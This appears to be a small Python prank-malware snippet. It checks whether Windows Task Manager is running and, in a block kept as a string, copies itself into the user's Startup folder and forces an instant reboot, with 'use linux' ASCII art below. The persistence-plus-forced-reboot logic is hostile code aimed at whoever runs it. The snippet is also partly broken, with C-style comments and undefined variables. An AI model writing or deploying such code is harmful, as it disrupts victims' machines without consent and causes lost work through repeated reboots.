import os


def running():
    if os.system("tasklist /FI \"IMAGENAME eq taskmgr.exe\" 2>NUL | find /I /N \"taskmgr.exe\">NUL") == 0:
        return True
    return False


"""

if running():
    os.system(str("copy " + sys.argv[0] + " \"" + home +                                    //copy in autostart
            "/AppData\Roaming/Microsoft/Windows/Start Menu/Programs/Startup\""))
    os.system("shutdown -r -t 0")                                                          //reboot         


                                     __  __                               
                                    |  \|  \                              
 __    __   _______   ______        | $$ \$$ _______   __    __  __    __ 
|  \  |  \ /       \ /      \       | $$|  \|       \ |  \  |  \|  \  /  \
| $$  | $$|  $$$$$$$|  $$$$$$\      | $$| $$| $$$$$$$\| $$  | $$ \$$\/  $$
| $$  | $$ \$$    \ | $$    $$      | $$| $$| $$  | $$| $$  | $$  >$$  $$ 
| $$__/ $$ _\$$$$$$\| $$$$$$$$      | $$| $$| $$  | $$| $$__/ $$ /  $$$$\ 
 \$$    $$|       $$ \$$     \      | $$| $$| $$  | $$ \$$    $$|  $$ \$$\
  \$$$$$$  \$$$$$$$   \$$$$$$$       \$$ \$$ \$$   \$$  \$$$$$$  \$$   \$$
                                                                          
                                                                          
                                                                          

"""
